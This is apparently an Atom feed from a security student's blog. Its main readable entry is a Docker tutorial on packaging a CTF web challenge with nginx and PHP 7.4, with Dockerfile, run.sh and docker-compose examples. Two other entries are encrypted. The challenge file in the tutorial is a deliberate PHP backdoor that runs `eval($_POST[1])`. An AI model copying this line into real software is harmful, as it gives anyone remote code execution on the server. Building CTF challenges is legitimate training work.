<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-08-17T09:33:39.370Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>show-Java</title>
    <link href="https://ke1nys.github.io/posts/80cd2c80.html"/>
    <id>https://ke1nys.github.io/posts/80cd2c80.html</id>
    <published>2023-08-06T04:39:35.000Z</published>
    <updated>2023-08-17T09:33:39.370Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="73cd30483b9dbf0da88a72b33e5186350bb4ac400b885c5deba837d8bc627781">1a90164da2a38547586d85c848ea232366b2d39f28f378a80a9367580f0834c7791a23bf6397ceb037ecf4f99edf772ba12fdc06222369dd2343a3df46e26c9f19dd34dc92b8b229d6695f6e68e00caf97edc9dd9d5fcd3f49126aabbd1ab556ff9e510b833729b75e52522d7bb181b2cc9df88b214f37b239aaf7f2d68a0d3eb46a812d0971d7a44a201c12aec06d4f248475df9fbf7a96a80ebe3d434bcac12a8aeda7443dfa550266190a399a10e6b16c28947dbe6792c1db6be01f5b390527fe3051aaa3487a15c3cdc9335df7f58c56f63a1b77257c8757bd19d99c7e10afec8b55381d0965519da5fc59de4e056bf7a36c6b6316a9232358da4d12c5fe3271f1c29754092f8796f8e196a56d769e1f0fdc7d88ac33c21aa1062c34d6a1b39d04dc230d26db466698233fd099aecdd432072d49c758474070f8856386e16f86791e01fb04e0351d3a1e40293bc890839512ec6607e6dd450565e25041fdfb80a0cc94d105dce3f7db8dac0ecc860b39777e58657940c4004e9d7519ea0c0d718efd11f92e8290b79608d597e262620d54c6702c4bfb58a0b66a15986b676a16cea64d19ba1a78b082666d6bf9d823fd01438c26435989a3c30b82ab0ce20c0da9182eaa57f08cec8f4ea9b067a67ade848213de8644e0b3a36de602e9d02e67f842923f5c61b8f8bdbea90a7398334c4253776ed36d80ebca4da1e0905c1b62ca88af8f45ab87b540e0ed810b54ad20061f7f4aecb50caac4bb261cec63404efd0a776ed11988001e275f21591429fee23d911b97528b148e7bb3836ee800de8f6ce87d3124f28e300aeea590d37490fd7b1d83f9a94b810bf1b3165c526102441f121f5d0e51765230a96943046282b63871692d3e31e324f388aecc46e89f0dfe9d12957f2e144e6a60814d466e229398175392e95601c280d674213bb417f5d9c48b0ec16d5cda87b83e405b495b298b2d0b65bc90941b1d5e599383e4fbfef2881367c5411cc1bc5c76e596af5e07760d2327e836a6486d15e8def4976343d35c10a22418bd9847182b71c263081f1196a194a86bf83cb5e2935b6a418765a659e65e9efb36f54917bd6c5fdec3c5e87500b0252448aa2ae62ccd3ec884c74a612e69f78e004401c521b8c2c2283327cb5accdaf641ab91c32f12d7179619537033e22be5f5f991e019671eb92a30175b2e0454f9232e69997a0a08ea440b94170f099839a8a1c243cc88e16156f9718242ecc0fb3a734e1611820461048b4498984ce3a4bad604f72ed8d268619830643f959a0b0b1ccc81294351cea1f139fdf492fa2794855f942b270f94178cb62523a31f4fa6417034cf695e64068d7a5187f1e2e20ccc0b54f0d4a56c7989ef1729513b80a3abf3e344d9ba1dea41795d37cf6ca5c5f53e4c19703c8e2023623ef6e2ec8def7d0bd5ec0ca032d623c37b914ce42435c8e449a9b4e1323a56e19d323b5d3b3097b8c0bcdc0dd9258a4cab7a880a677d1e14a76734b554078ecd8e7be5623e073f3558cf80ea659e9946ca6ea0b0a745315139a90d2ac0e7010d0a094289821cfb63759d3315fa59d5f15a55da28bab24acf776376a928d2a1215d75e33e589a83104c4afe2b2df0f22811a8ade7b56cf72d7084eb21e74b8e5f6de6c08bb6485c4e54720129c2abaca61692d91fc7fc877813c93a7c69602cfb87549213911c1e5d92f27bf88c5664452510c522ae8d42771bef43f7a64362ff45fd339490f2db226346f149f66f17c1289eb4fdd4c1a50fb8c9481ae8518ce4ce348c357ce45d09131c4e31c4f237ce43c6edbd1b18fb94b50087d614b608b2bdada52786e84f6bc3d9656e0205bb7febe6e712a5207a9435d2aa2ff732f72acd9625022960f729bbcf1282858a317101bce9d122f94db3f21f93f771dbcf7bc822382ef6e5f52ef8d0aa598dae9b155b25cfe879e0979e10b699ddc0259480d4fdf776d59325efcac7ae84431d649c711bb4c3165e1aaca6fe56f86312868ecb70bd7eb1c001d601fccc833df17b08d375c86209a4aab4aa972643d536c1189c419dd7b875ba9fdf7c11443e9b1506b5995871e0c1e3828a69e6b1e18185dd2a78d7e9607eddf748db4d01b91983045be23062fae06357d02b2f98d761a15b8a6b58c165a610bc52cfe4d579a4c15738079f4b221700e9b0f04fa39e9e18dcd7cb396cae904c698974f7b8d05fa7b9535eb90ee14981a07b3b0f363b644520c9b5f7131c5bdfd2ae8050645aa82813dbd062df9499e13f34e353be3507fd7432190d9a6597bd7c774a4924c85c82ce3c31ee89ce7f7ce3bf3a7d9ce42ae1396f31b3231634e854d61bea0db1ff2381f7f407d29144b0ddc317baa6828a9c8375177aa7755f9e0d0211e1fefccab297b72209255fe7d0be13e12e4f1afb2a1aa8db7d6144b4ed25d29d52d3b2b1f4ec9e317ac92f398cc22ff2ce6c783276c5bba42e80c7a3f7b35a3914e3cf0bd76051e2fb6111ab01323d03e7687338633f1ccf89f8febdbaeefbbf3c6e3e145b33cf74fbad1e203ea21fd634c4c9873f58c7f2cfa4cde8e5e2b7dfefcf7bf0e29aaf20cccdf9803b54ebc4626e4d8b686b6903557fcbd70ab29e3f5b614388c7b57c385ffb00f776b5e6074ed2d6e62dc10be07e20f3a84ed39bc8e71069956a67a86c2483b55dd74a6cb4cddff0ccd6add6abb37954b8867ce22201a8ce3ed2ef144fb356c6d4de362935b78916d121651585cbff03dc94955add0060c79752a9ed25fcdffdd0d7fc4f121e552a55d0d61bf32a66b0fb8346894bc709dd4228eaff09bc37618a3a859814e3ba7c30649dc1f12035093b1c194ba3ef9138c8affa63149050ec047efc3dd1d09b6cada27c59d778e81048f35640815df97009a42ad7bb17eaeb6d9fffe040700e5c45d25f82c9d290136a5847e1c2155755c0bf63b653b8ed21b566e9a82a18cbc88d76aeb92a467ce77c3376f473bb0377ffa3736ea95bcb76be8da7dedb759e62ebb6ab8d8dd3b256d1929d51c54d53ea932d824fabd5e689e54c9b0c3e4eac443e4cdb7f153bb99895316908d0b7e6f04c9a6d8a5f4f637b2f239f3ad435d88aff866ea4c5a5e14ef93b82e4d5eacc5bd7e30cac2772bc084007a40c45aa0fb5a3f3cd6004c95dc63c9376bd315b96d1b86207c4eb4af6500e1836d2bfce711e903710775a74714d72ec3a7d06d21c8062c447e5d59ba93f1cda750bacbde4170ed3c319a845010eba992a3132f4f7233d4d825ec9dc781aec3b357ce6e07fc6ae9dba02863e9db4343e6146d756f877be1169d0964cd94b66090d39381b8b3064082d5f4ae18efdf04dc6197568cb9ac4c28dc4bc00907f4752a806ea5152b5bbbdc4526934954cad01de7037bd36c2dfe93d8536418011f3cbc2e6a2008d0798a024af1ce5071b054812c523d7b4d56f7cda0751e6ab92652146dcde1105ecc792a99769806e2faa119b6bf9bc1ac22009e55e248af36512c53909837c5d7cb155f8d857a0f193d606b55a8f93988f2195dd55ec6ee59df11eb0f61524f8315a59d1ce79266e082b8be7112b2906196ebfc000890cc0c9f8c43da99ddb8b19ac87cc67fe8695f49edc0bfba3e40af6bbdba62154db63773bd185043c69897872a17ebb63537f9c8c7e6a78c5a24216df9eb08fbcfe311b95b6763b11b773ea889e72c709f003f99f67b417da4fff1e686461a34f0b5fcd7f4726cb0a060ac3b14e149a97b80f3725dc85d4a66ed060ae5b3f108673082cdb347b948407b8a820fb224742563fb9048fe8f328fef4ec7794440e356a9229d037aa7e53f8de7b3f9cf18e666bda73f7ba3d60bdee645689eb4a4052eaec5cb6d3f25b75abdd81006e7ba09fbd91833c51316635dd9bf3e3e244e2d6c2884047d044004dfc83c4342d0a6ec5dc7d87746f4d6bc2805215a8d1257d043fd8ee78240b620086f77fcec378f9859ee58f190a05f76145ff6d48ff8d91877e8c8076b555ac63eb03dc3563acd352d0d2d06e958a893e9d3ff508bcae65af35de2b451ae0e6125582b6e2eca0236e4bf123c8f8f76060274d1fb6e70d71c5bc9d44638079d2821d2d2f930d3b5375c4eccd9e205fbf437c63fde682e77fbdb152338873296296cc8ae7d4f5555d723a94cf38e03ddf5826a9e5d1ce25ec538c728af8ec6790f8e681f89353f92e643e73d7c54ce2d6f023c8f0040998c7ed883fcd92fd2037ad54048d30a146bc69e364e5afd46fb4714db6bf588e51f5285f4816bf524d5b0c678291006a63b1bbb9e107430ac47fc26387ed341af4bca05b2e1f1e9da5a3fd6a9185c58e8721f8ceaa4947a2a9bf3f01c99f1cfca84b46ccff6eb6486a3146dea3367bc38a88e8809230aa7dc98f89f75b9bc6c4aca2323c29a8ad5330363f793d7e4916106666ba81078ba21aafc4df4ca276d4ce1b88bc922facbab723118614f5abc2af532cfb443ffe3ae6026ce1d84fa1cd80406cd618b734e8bc24bd6a0004d392f99dcf76d11944a42909f9ebb39207da928faa51188a45fcb6c3e6a8c520b88e26a148f50d793a6f7a33936cd951774871b335d352792611f649c1847d6bd29d35a20584ceaea2c7eb7cba3e26287ec6e2557bec663c343e1aaff0531f1629386d82c110f7f079944b88eb1d7d5b6c002a3693ca136aedda249441f8216264684e1d7c206cc92f3398706a52710ccd3fad585166526427df270b08deaaf54da8e881ffb787116148154ed6e8c70e935335a21e09e145fe5b099ed279bae3f3c2b0180afbf7664092e93102ce416201ee108b163d98aa1a080d2f53bcb6b6696e88f023b05eb9430b4b7ecc34d9589ef99f2f450cb45d1a4d82ddb53a4391919a6173709fe016b16119f374975972d9e4a5a3a92c7d485bfe8aea62ef4eaf655d4cf34f83ce404a6bb8b93a5de9e46a4acdb9d9f64afa208de2712a7e01ea547c83406859d4ea32748b350db5b936c60f49d68c64ed613e905f3087978c833834de377b267fd86a253c3da29658b4371a65d92df291d2cb444e359df723c348a330d00d124f1be778d89fd3b0a5df138079244239364e1aed51f60c4514e81460e809f059107c80edcc8ce07fc78328d5abdffd041a1f02983c6274b5fea10073001d3feb071c59fb9085c5767113db4698b3caf12259287941c6d4c3dfac2b174220680a3d768c8c77eedcc73e13add04a490a6b919a4e1e3891c65d8e685b2d820c5f76134ba89a68bd2847b020330c5721409f7748bdd30ad38fef6386658ecffb320bae2106cd9d487ffb5caf595e92f36ebcadcaa7768a3bc6f25a2ab935f5269dd2a1185a85a7b03e7d80c487726b7abcf42da409ec0f3212ed0292332237fed998ab9782acbcddf4f03e3ad1a68f106e8d11b15f1efe294c3a9cdabb048ff66f860864f308ad8627a9cf5e0762cada25ff3e2747af04f06758f258d93253425f60daf63a9e09803c460102d9661f2a39f4bfcb9ac3e4077a31818c520ebc1004e8bad03537ca2435b97a5a411bfa95402f24782823d20a28770d75406f3a9d5899eef94f30c6d742ed95da00b7daf48de9e8eb743712e41eec067710e48368bf3122322acab03058821b848de98d3e506b2e90ff95466a1f256a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Java" scheme="https://ke1nys.github.io/tags/show-Java/"/>
    
  </entry>
  
  <entry>
    <title>show-Nodejs污染</title>
    <link href="https://ke1nys.github.io/posts/bb258da4.html"/>
    <id>https://ke1nys.github.io/posts/bb258da4.html</id>
    <published>2023-08-02T12:01:56.000Z</published>
    <updated>2023-08-17T09:33:39.341Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="002b0ee2c18d22730468acf2015e92289c83047ce6da97b64263cefb34958d12"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Nodejs污染" scheme="https://ke1nys.github.io/tags/show-Nodejs%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>Docker-学习</title>
    <link href="https://ke1nys.github.io/posts/75581288.html"/>
    <id>https://ke1nys.github.io/posts/75581288.html</id>
    <published>2023-07-31T03:16:07.000Z</published>
    <updated>2023-08-17T09:33:39.338Z</updated>
    
    <content type="html"><![CDATA[<p>这里写这个的话主要是为了记录这个<strong>学习<code>docker</code>的过程</strong></p><p><a href="https://blog.csdn.net/YBaog/article/details/125349766">参考文章1</a></p><p><a href="https://www.zeker.top/posts/f7e6aba0/#%E4%BA%94%E3%80%81Docker-compose">参考文章2</a></p><p><strong>docker安装方式自行google 很快就能安装好了</strong></p><p>(<strong>之前只是简单的了解了一下docker  没咋用过 现在开始学习后才发现docker的强大</strong>)</p><ul><li>ubuntu </li><li>nginx </li><li>php7.4-fpm</li></ul><p>以上就是要用到地东西</p><h3 id="拉取ubuntu镜像"><a href="#拉取ubuntu镜像" class="headerlink" title="拉取ubuntu镜像"></a>拉取ubuntu镜像</h3><p><code>docker pull ubuntu</code>    (不指定版本地话都是拉取最新的版本)</p><p>或者在Docker-desktop  里面搜索下载也是可以的</p><p><img src="../images/image-20230731141029597.png" alt="image-20230731141029597"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -p 8080:80 --name=ctf ubuntu(镜像ID)</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit   //是退出</span><br></pre></td></tr></table></figure><p>启动一个已停止的容器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start b750bbbcfd88 (镜像ID)</span><br></pre></td></tr></table></figure><p>进入容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker attach b750bbbcfd88 (镜像ID)</span><br><span class="line">或者</span><br><span class="line">docker exec -it b750bbbcfd88 /bin/bash</span><br></pre></td></tr></table></figure><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><p>这里的话直接是在<code>Ubuntu</code>里进行安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y nginx    //-y  是全部默认的意思</span><br></pre></td></tr></table></figure><p><strong><code>nginx</code>命令</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭</span></span><br><span class="line"><span class="attribute">service</span> nginx stop</span><br><span class="line"><span class="comment"># 开启</span></span><br><span class="line">service nginx start</span><br><span class="line"><span class="comment"># 状态</span></span><br><span class="line">service nginx status</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><h3 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h3><p>这里我选择的是<code>php7.4</code>版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y software-properties-common</span><br><span class="line"></span><br><span class="line">add-apt-repository ppa:ondrej/php</span><br><span class="line"># 出现暂停，按回车键[ENTER]</span><br><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt-get install -y php7.4-fpm</span><br><span class="line"># 必须得是按照顺序来</span><br></pre></td></tr></table></figure><p>php7.4-fpm-命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 关闭</span><br><span class="line">service php7.4-fpm stop</span><br><span class="line"># 开启</span><br><span class="line">service php7.4-fpm start</span><br><span class="line"># 状态</span><br><span class="line">service php7.4-fpm status</span><br><span class="line"># 重启</span><br><span class="line">service php7.4-fpm restart</span><br></pre></td></tr></table></figure><h3 id="安装Vim"><a href="#安装Vim" class="headerlink" title="安装Vim"></a>安装Vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y vim</span><br></pre></td></tr></table></figure><h3 id="环境配置与搭建"><a href="#环境配置与搭建" class="headerlink" title="环境配置与搭建"></a>环境配置与搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230731142244821.png" alt="image-20230731142244821"></p><p>添加<code>index.php</code> 并且把下面指定的代码取消注释</p><h4 id="启动nginx和php服务"><a href="#启动nginx和php服务" class="headerlink" title="启动nginx和php服务"></a>启动nginx和php服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 检查 nginx 配置文件</span><br><span class="line">nginx -t</span><br><span class="line"># 重启 nginx</span><br><span class="line">service nginx restart </span><br><span class="line"># 启动 php7.4-fpm</span><br><span class="line">service php7.4-fpm start </span><br></pre></td></tr></table></figure><p>这里的<code>nginx -t</code> 可以用来检查修改的配置是否修改正确  如果修改错误的话会报错提醒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前进程</span><br><span class="line">ps -aux</span><br><span class="line"># 查看 nginx 状态</span><br><span class="line">service nginx status </span><br><span class="line"># 查看 php7.4-fpm 状态</span><br><span class="line">service php7.4-fpm status </span><br></pre></td></tr></table></figure><p><strong>检查这个<code>nginx</code>和<code>php</code>服务的运行状态</strong></p><p>然后去访问一下开放的端口   看<code>nginx</code>是否在正常运行</p><p><img src="../images/image-20230731143616100.png" alt="image-20230731143616100"></p><p>那么我们就去修改该目录下的文件  让其显示我们想要显示的内容</p><p>(<strong>将该html文件删除</strong>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /var/www/html/index.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">eval($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将上述内容写入   然后去访问</p><p><img src="../images/image-20230731143820087.png" alt="image-20230731143820087"></p><p>成功写入    </p><p><strong>(假如这是我们要出的题目   那么我们就可以尝试去将其变成镜像  方便部署)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .   </span><br><span class="line">// .的意思是把当前目录下的文件都给打包</span><br><span class="line">// -t 后面是跟着镜像名字  :后面是标签   都可以自己定义</span><br></pre></td></tr></table></figure><p>在构造镜像之前 我们要编写<code>Dockerfile</code></p><p>(<strong>它的作用是能帮助我们起容器</strong>)</p><h4 id="编写Dockerfile和docker-compose-yml"><a href="#编写Dockerfile和docker-compose-yml" class="headerlink" title="编写Dockerfile和docker-compose.yml"></a>编写Dockerfile和docker-compose.yml</h4><p>写这个的目的就是为了能帮助我们<strong>自动化部署环境</strong></p><p><strong>(例如就是自动安装<code>nginx</code>和<code>php</code>等等之类的工作)</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;Ke1nys&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更新软件源</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装nginx</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt install nginx -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装php7.4-fpm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y software-properties-common</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> add-apt-repository ppa:ondrej/php -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y php7.4-fpm</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除nginx默认html文件</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> /var/www/html/index.nginx-debian.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将题目源码复制过去</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/index.php /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/f1ag /</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/default /etc/nginx/sites-available/default</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 755 /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R root:root /var/www/html </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启用脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./run.sh /root/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash">  <span class="built_in">chmod</span> +x /root/run.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/root/run.sh&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面注释都写的很清楚了</p><p>接着写一个<code>sh</code>文件来帮我们自动化开启<code>nginx</code>和<code>php</code></p><p><strong>run.sh</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动nginx</span></span><br><span class="line">service nginx start</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动php</span></span><br><span class="line">service php7.4-fpm start</span><br><span class="line"></span><br><span class="line"><span class="comment"># # never exit，此处是为了运行完上条应用服务后，有对应的前台进程</span></span><br><span class="line"><span class="built_in">tail</span> -f /dev/null</span><br></pre></td></tr></table></figure><p>注释也是解释的很清楚了</p><p><strong><code>docker-compose.yml</code></strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定该文件版本</span></span><br><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="comment"># 把每个子目录视为一个镜像，开始构建</span></span><br><span class="line">services:</span><br><span class="line">  src: <span class="comment">#这个是文件目录名</span></span><br><span class="line">    <span class="comment"># 此处仅允许 image, build, ports，禁止其他字段出现，如果有 volume，cmd 等设置需求，请在 Dockerfile 里进行文件拷贝或者申明。</span></span><br><span class="line">    image: ctf/test1        <span class="comment">#镜像名字</span></span><br><span class="line">    build: ./           <span class="comment">#build的位置，docker会去web1中的dockerfile开始搭建</span></span><br><span class="line">    <span class="comment"># restart: always</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8080:80&quot;</span>           <span class="comment">#设置映射的断口</span></span><br><span class="line">    environment:</span><br><span class="line">      - FLAG=flag&#123;this_is_test_flag&#125;                      <span class="comment"># 这里定义了flag,但是不会覆盖sh里的$FLAG</span></span><br><span class="line">    <span class="comment">#   - FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125;  # 获取容器的uuid作为flag 会报错</span></span><br></pre></td></tr></table></figure><p>注释也是写的很清楚了</p><p><code>dockerfile</code>和<code>docker-compose.yml</code>   要与这个源码里的文件名对应上  不然会报错</p><p><strong>最后完成的文件结构图</strong></p><p><img src="../images/image-20230731145619175.png" alt="image-20230731145619175"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .   </span><br></pre></td></tr></table></figure><p><strong>生成镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -e 镜像id</span><br></pre></td></tr></table></figure><p>运行该镜像   </p><p>这样就能成功的将环境起起来了</p><h3 id="外网部署"><a href="#外网部署" class="headerlink" title="外网部署"></a>外网部署</h3><p>直接将文件发给自己的服务器上  然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>这样就可以将题目成功的部署在外网上了</p><p><img src="../images/image-20230731150347683.png" alt="image-20230731150347683"></p><p>(要记得开启题目所需的端口   不然可能会访问失败)</p><p><img src="../images/image-20230731150438136.png" alt="image-20230731150438136"></p><p>这样就部署成功了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里写这个的话主要是为了记录这个&lt;strong&gt;学习&lt;code&gt;docker&lt;/code&gt;的过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/YBaog/article/details/125349766&quot;&gt;参考文章1&lt;/a</summary>
      
    
    
    
    
    <category term="Docker" scheme="https://ke1nys.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>show-Python反序列化</title>
    <link href="https://ke1nys.github.io/posts/78e9e0c1.html"/>
    <id>https://ke1nys.github.io/posts/78e9e0c1.html</id>
    <published>2023-07-29T15:34:42.000Z</published>
    <updated>2023-08-17T09:33:39.340Z</updated>
    
